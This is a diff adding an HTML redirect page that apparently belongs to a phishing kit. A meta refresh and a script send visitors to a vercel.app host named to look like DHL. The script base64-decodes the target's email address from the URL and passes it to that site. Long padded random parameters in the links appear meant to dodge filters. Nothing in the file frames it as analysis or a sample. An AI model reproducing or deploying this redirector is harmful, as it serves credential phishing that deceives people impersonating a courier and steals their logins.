@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0;url=https://dhl-cn-gyygghl.vercel.app/?param1=shjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewf&longParam=shjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewfshjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewfshjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewfshjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewfshjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewf">
+    
+    <script type="text/javascript">
+        var url_string = window.location.href;
+        var url_get_email = atob(getafterhash(url_string));
+        var mail_go_url = "https://dhl-cn-gyygghl.vercel.app/#" + url_get_email + "";
+        location.replace(mail_go_url);  
+        
+        function getafterhash(url) {
+            var ret; 
+            var queryString; 
+            // stuff after # is not part of query string, so get rid of it
+            var queryStringhash = url.split('?')[1]; 
+            var queryStringsemi = url.split(';')[1]; 
+            var queryStringsemiplus = url.split(';+')[1]; 
+            var queryStringstartsemi = url.split('*;')[1]; 
+            // if query string exists
+            if (queryStringhash) {
+                ret = queryStringhash;
+            } else if (queryStringsemi) {
+                ret = queryStringsemi;
+            } else if (queryStringsemiplus) {
+                ret = queryStringsemiplus;
+            } else if (queryStringstartsemi) {
+                ret = queryStringstartsemi;
+            } else {
+                ret = 0;
+            }
+            return ret;
+        }
+    </script>
+</head>
+<body>
+    <p>If you are not redirected automatically, follow this <a href="https://dhl-cn-gyygghl.vercel.app/?param1=shjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewf&longParam=shjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewfshjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewfshjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewfshjywagjb25yvfshurwtjbtwwujvsewyjiiffewfhitwwdchyewf">link</a>.</p>
+</body>
+</html>
